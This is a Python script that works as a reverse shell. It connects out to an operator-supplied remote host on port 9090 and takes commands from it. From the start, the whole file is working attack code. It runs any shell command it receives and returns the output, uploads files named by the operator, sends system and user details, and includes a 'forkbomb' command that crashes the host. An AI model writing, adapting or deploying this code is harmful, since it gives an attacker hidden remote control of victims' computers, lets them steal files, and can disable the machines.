import socket
import subprocess
import os
import sys
import getpass
import platform
import colorama
from colorama import Fore, Style
from time import sleep

colorama.init()

# Server details
RHOST = sys.argv[1]  # Remote host IP
RPORT = 9090         # Remote host port

# Create and connect the socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((RHOST, RPORT))

while True:
    try:
        # Send prompt
        header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
        sock.send(header.encode())

        # Receive command
        cmd = sock.recv(1024).decode("utf-8")

        if cmd == "list":  # List files in the current directory
            files = os.listdir(".")
            sock.send(str(files).encode())
        
        elif cmd.startswith("cd "):  # Change directory
            try:
                os.chdir(cmd.split(" ")[1])
                sock.send(f"Changed directory to {os.getcwd()}".encode())
            except FileNotFoundError:
                sock.send(b"Directory not found")
        
        elif cmd == "sysinfo":  # Get system information
            sysinfo = f"""
Operating System: {platform.system()}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
Release Version: {platform.release()}
Processor Architecture: {platform.processor()}
            """
            sock.send(sysinfo.encode())

        elif cmd.startswith("download "):  # Download a file
            file_path = cmd.split(" ")[1]
            try:
                with open(file_path, "rb") as f:
                    file_data = f.read(1024)
                    while file_data:
                        sock.send(file_data)
                        file_data = f.read(1024)
                sock.send(b"DONE")
            except FileNotFoundError:
                sock.send(b"File not found")
        
        elif cmd == "forkbomb":  # Fork bomb (use with caution)
            while True:
                os.fork()

        elif cmd == "exit":  # Exit the script
            sock.send(b"exit")
            break

        else:  # Execute any other command
            comm = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout, stderr = comm.communicate()
            if stdout:
                sock.send(stdout)
            if stderr:
                sock.send(stderr)

    except Exception as e:
        sock.send(f"Error: {str(e)}".encode())
        print("An error occurred:", e)

# Close the connection
sock.close()


#Still need to be changed